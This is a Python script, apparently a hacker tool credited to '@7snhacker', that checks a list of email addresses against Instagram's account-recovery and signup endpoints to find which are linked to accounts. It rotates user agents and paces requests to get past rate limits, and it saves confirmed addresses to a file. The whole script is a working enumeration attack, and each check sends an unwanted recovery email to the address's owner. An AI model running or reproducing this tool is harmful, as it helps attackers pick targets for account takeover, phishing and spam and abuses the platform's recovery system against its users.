import requests
import time
from user_agent import generate_user_agent
lst = open("email.txt","r")
print("""
    ███████╗███╗   ███╗ █████╗ ██╗██╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
    ██╔════╝████╗ ████║██╔══██╗██║██║     ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
    █████╗  ██╔████╔██║███████║██║██║     ██║     ███████║█████╗  ██║     █████╔╝ 
    ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
    ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
    ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
by @7snhacker""")
print("")
print("click Ctrl Z to stop")
sleep = float(input("sleep : "))
while True:
    reads = lst.readline().split('\n')[0]
    time.sleep(sleep)
    regurl = "https://www.instagram.com/accounts/web_create_ajax/"
    date = {
        'email': reads,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:qwertqwert123',
        'username': 'fwehffiwegwu',
        'first_name': 'AccountReg V0.1',
        'month': '6',
        'day': '4',
        'year': '1991',
        'client_id': 'YKO7zAALAAEHgitI_xa4QMENkQfn',
        'seamless_login_enabled': '1',
        'tos_version': 'row',
        'force_sign_up_code': 'vKOxrL5D'
    }
    head = {
        'accept': "*/*",
        'accept-encoding': "gzip, deflate, br",
        'accept-language': "es-ES,es;q=0.9,en;q=0.8",
        'content-length': "241",
        'origin': "https://www.instagram.com",
        'referer': "https://www.instagram.com/",
        'user-agent': f"{generate_user_agent()}",
        'x-csrftoken': "95RsiHDyX9J6AcVz9jtCIySbwf75QhvG",
        'x-instagram-ajax': "c7e210fa2eb7",
        'x-requested-with': "XMLHttpRequest",
        'Cache-Control': "no-cache"
    }
    req = requests.session()
    link = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
    req.headers = {'user-agent': generate_user_agent()}
    req.headers.update({'X-CSRFToken': "missing"})
    data = {"email_or_username":reads}
    r = req.post(link,data=data)
    if ("We sent an") in r.text:
        response = requests.get(regurl, data=date, headers=head)
        if "email_code_incorrect" in response.text:
            print(f"Linked : {reads} : valid[*]")
            with open("Linked.txt", "a") as Linked:
                Linked.write(reads + "\n")
        else:
            print(f"Linked : {reads} : invalid[!]")
    elif ("Please wait a few minutes before you try again.") in r.text:
        print("Please wait a few minutes")
        time.sleep(3)
        print("You Send Many Requests")
    else:
        print(f"UnLinked : {reads}")



